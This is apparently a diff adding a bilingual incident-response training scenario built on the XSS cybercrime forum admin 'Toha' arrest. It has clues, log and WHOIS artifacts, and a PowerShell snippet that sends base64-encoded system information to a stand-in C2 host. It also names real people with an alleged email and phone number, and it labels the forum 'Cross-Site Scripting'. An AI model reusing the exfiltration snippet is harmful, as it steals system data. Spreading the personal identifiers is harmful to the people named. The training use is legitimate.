@@ -1,0 +1,114 @@
+{
+  "title": {
+    "tr": "XSS Siber Suç Forumu Baskını: Gizemli Yönetici 'Toha' Kim?",
+    "en": "XSS Cybercrime Forum Raid: Unmasking the Mysterious Admin 'Toha'"
+  },
+  "difficulty": "advanced",
+  "news_article_text": {
+    "tr": "**Kime:** Kıdemli Olay Müdahale Uzmanı\n\n**Kimden:** SIEM Sistemi\n\n**Konu:** Acil! XSS Siber Suç Forumu Yöneticisinin Tutuklanması ve Şüpheli Aktiviteler\n\n**Uyarı Detayı:** SIEM sistemimizde, Ukrayna'daki bir konutta yapılan bir baskın sonucu ele geçirilen verilerden elde edilen bir dizi şüpheli aktivite tespit ettik. Bu aktiviteler, uzun süredir faaliyet gösteren Rusça konuşan bir siber suç forumu olan XSS ile bağlantılı görünüyor.  Tutuklanan şahsın, forumda 'Toha' takma adını kullanan ve işlemlerin güvenliğini sağlayan bir yönetici olduğu tahmin ediliyor.\n\n**Kaynak:** Europol raporu, Ukrayna SBU güvenlik servisi açıklaması, çeşitli siber güvenlik forumları ve haber kaynakları.\n\n**Not:** Tutuklama sonrasında, XSS forumunun Tor ağı üzerinden yeni bir adrese taşındığı gözlemlendi. Forum üyeleri arasında tutuklanan kişinin kimliği konusunda belirsizlik hakim.  Tutuklanan kişinin yaklaşık 20 yıllık bir siber suç geçmişi olduğu belirtiliyor.  Ek olarak,  'Toha'nın'  toschka2003@yandex.ru e-posta adresi ile ilişkili birden fazla alan adı kaydı tespit edildi.  Bu alan adlarının kayıtlarında Anton Medvedovskiy ve Yuriy Avdeev isimleri yer alıyor.  LockBit ransomware grubunun lideri, Toha'nın gerçek adının Anton Avdeev olduğunu iddia etti.  Ayrıca, 9588693 numaralı telefon ile Anton Viktorovich Avdeev adına kayıtlı Rus hükümeti kayıtlarına ulaşıldı.  Eski bir siber suçlu olan Sergeii Vovnenko, 2009 yılında Toha'dan kredi kartı klonlama cihazı satın aldığını belirtti.  Toha'nın, 2010'dan 2014'e kadar faaliyet gösteren güvenli bir Jabber sunucusu olan thesecure[.]biz'i çalmış olabileceğinden şüpheleniliyor.  Soruşturma, XSS forumunun kullanıcıları arasındaki özel mesajları, iletişim listelerini ve Jabber sunucusuyla bağlantılı diğer kullanıcı verilerini içeren yıllarca değerinde veriyi ortaya çıkardı.\n\n**Göreviniz:** Etkilenen kullanıcıları tanımlayın, saldırganın altyapısını haritalandırın ve yayılmayı önlemek için acil bir eylem planı sunun.  Proxy, DNS, Azure AD oturum açma günlükleri ve diğer ilgili log kaynakları incelenmelidir.",
+    "en": "**To:** Senior Incident Responder\n\n**From:** SIEM System\n\n**Subject:** Urgent! Arrest of XSS Cybercrime Forum Administrator and Suspicious Activities\n\n**Alert Details:** Our SIEM system detected a series of suspicious activities stemming from data seized during a raid on a residence in Ukraine. These activities appear to be linked to XSS, a long-operating Russian-speaking cybercrime forum. The arrested individual is believed to be an administrator of the forum, using the handle 'Toha,' who guaranteed the security of transactions.\n\n**Source:** Europol report, Ukrainian SBU security service statement, various cybersecurity forums and news sources.\n\n**Note:** Following the arrest, the XSS forum resurfaced at a new address on the Tor network. There is uncertainty among forum members about the identity of the arrested person. The arrested individual is said to have a nearly 20-year history in cybercrime.  Additionally, multiple domain registrations linked to 'Toha’s' toschka2003@yandex.ru email address were found.  Anton Medvedovskiy and Yuriy Avdeev names appear in the registrations. The leader of the LockBit ransomware group claimed Toha's real name is Anton Avdeev.  Furthermore, Russian government records were found under the name Anton Viktorovich Avdeev and phone number 9588693. A former cybercriminal, Sergeii Vovnenko, stated that he bought a credit card cloning device from Toha in 2009. Toha is suspected of stealing thesecure[.]biz, a secure Jabber server operating from 2010 to 2014. The investigation uncovered years' worth of private messages between XSS forum users, contact lists, and other user data linked to the seized Jabber server.\n\n**Your Task:** Identify affected users, map the attacker's infrastructure, and provide an urgent action plan to prevent further spread. Proxy, DNS, Azure AD sign-in logs, and other relevant log sources should be examined."
+  },
+  "related_concepts": [
+    "XSS (Cross-Site Scripting)",
+    "Cybercrime Forums",
+    "Dark Web",
+    "Ransomware",
+    "Threat Intelligence"
+  ],
+  "clues": {
+    "initial_access": {
+      "keywords": [
+        "initial access",
+        "compromise",
+        "intrusion",
+        "access",
+        "entry"
+      ],
+      "hint": {
+        "tr": "Toha'nın kullandığı toschka2003@yandex.ru e-posta adresinin, birden fazla siber suç forumunda ve alan adı kaydında kullanıldığını araştırın.",
+        "en": "Investigate the use of Toha's toschka2003@yandex.ru email address across multiple cybercrime forums and domain registrations."
+      }
+    },
+    "defense_evasion": {
+      "keywords": [
+        "stealth",
+        "evasion",
+        "antivirus",
+        "evasion",
+        "av"
+      ],
+      "hint": {
+        "tr": "Toha'nın güvenli Jabber sunucusu 'thesecure[.]biz'in, kullanıcı aktivitelerinin kayıtlarını tutmadığını ve güvenilir bir yönetici tarafından işletildiğini inceleyin.",
+        "en": "Examine the fact that Toha's secure Jabber server 'thesecure[.]biz' kept minimal user activity records and was operated by a trusted community member."
+      }
+    }
+  },
+  "artifacts": [
+    {
+      "id": "artifact-01",
+      "type": "log",
+      "title": {
+        "tr": "Güvenlik Günlüğü - Olay Kimliği 4625",
+        "en": "Security Log - Event ID 4625"
+      },
+      "content": {
+        "tr": "Log Adı: Güvenlik\nKaynak: Microsoft Windows güvenlik denetimi\nOlay Kimliği: 4625\nSeviye: Hata\n---\nBir hesap oturum açmada başarısız oldu.\n\nHesap Adı: administrator\nKaynak Ağ Adresi: 185.125.190.23\nKaynak Port: 58172\n\nHata Kodu: 0xC000006D",
+        "en": "Log Name: Security\nSource: Microsoft Windows security auditing\nEvent ID: 4625\nLevel: Error\n---\nAn account failed to log on.\n\nAccount Name: administrator\nSource Network Address: 185.125.190.23\nSource Port: 58172\n\nFailure Code: 0xC000006D"
+      }
+    },
+    {
+      "id": "artifact-02",
+      "type": "report",
+      "title": {
+        "tr": "WHOIS Raporu - malicious-c2.com",
+        "en": "WHOIS Report - malicious-c2.com"
+      },
+      "content": {
+        "tr": "Alan Adı: malicious-c2.com\nKayıt Eden: NameCheap, Inc.\nOluşturma Tarihi: 2025-08-29T10:00:00Z\nGüncelleme Tarihi: 2025-08-29T10:00:00Z\nİsim Sunucuları: ns1.private-dns.com",
+        "en": "Domain: malicious-c2.com\nRegistrar: NameCheap, Inc.\nCreation Date: 2025-08-29T10:00:00Z\nUpdated Date: 2025-08-29T10:00:00Z\nName Servers: ns1.private-dns.com"
+      }
+    },
+    {
+      "id": "artifact-03",
+      "type": "file_analysis",
+      "title": {
+        "tr": "Dosya Analizi - update.exe",
+        "en": "File Analysis - update.exe"
+      },
+      "content": {
+        "tr": "Dosya Adı: update.exe\nMD5 Hash: e4d909c290d0fb1ca068ffaddf22cbd0\nTespit Oranı: 58/70\nİmza: Trojan:Win32/Wacatac.B!ml\nİlk Görülme: 2025-08-30",
+        "en": "File Name: update.exe\nMD5 Hash: e4d909c290d0fb1ca068ffaddf22cbd0\nDetection Ratio: 58/70\nSignature: Trojan:Win32/Wacatac.B!ml\nFirst Seen: 2025-08-30"
+      }
+    },
+    {
+      "id": "artifact-04",
+      "type": "code",
+      "title": {
+        "tr": "Şüpheli PowerShell Kodu",
+        "en": "Suspicious PowerShell Code"
+      },
+      "content": {
+        "tr": "# C2 sunucusuna sistem bilgilerini gönderen PowerShell betiği\n$c2_url = \"http://malicious-c2.com/gate.php\"\n$sys_info = Get-ComputerInfo | Out-String\n$encoded_info = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($sys_info))\nInvoke-RestMethod -Uri ($c2_url + \"?data=\" + $encoded_info) -Method Post",
+        "en": "# PowerShell script sending system information to the C2 server\n$c2_url = \"http://malicious-c2.com/gate.php\"\n$sys_info = Get-ComputerInfo | Out-String\n$encoded_info = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($sys_info))\nInvoke-RestMethod -Uri ($c2_url + \"?data=\" + $encoded_info) -Method Post"
+      }
+    },
+    {
+      "id": "artifact-05",
+      "type": "dns_log",
+      "title": {
+        "tr": "DNS Günlüğü Kaydı",
+        "en": "DNS Log Entry"
+      },
+      "content": {
+        "tr": "Tarih: 2025-09-01 14:25:10 | İstemci: 10.1.5.122 (DC01) | Sorgu: A | Alan Adı: malicious-c2.com | Yanıt: 185.125.190.23",
+        "en": "Date: 2025-09-01 14:25:10 | Client: 10.1.5.122 (DC01) | Query: A | Domain: malicious-c2.com | Response: 185.125.190.23"
+      }
+    }
+  ],
+  "ratings": [
+    {
+      "userId": "user-89fa3930-9181-4ba8-9e2b-36c3bc5f7c8b",
+      "rating": 4
+    }
+  ]
+}
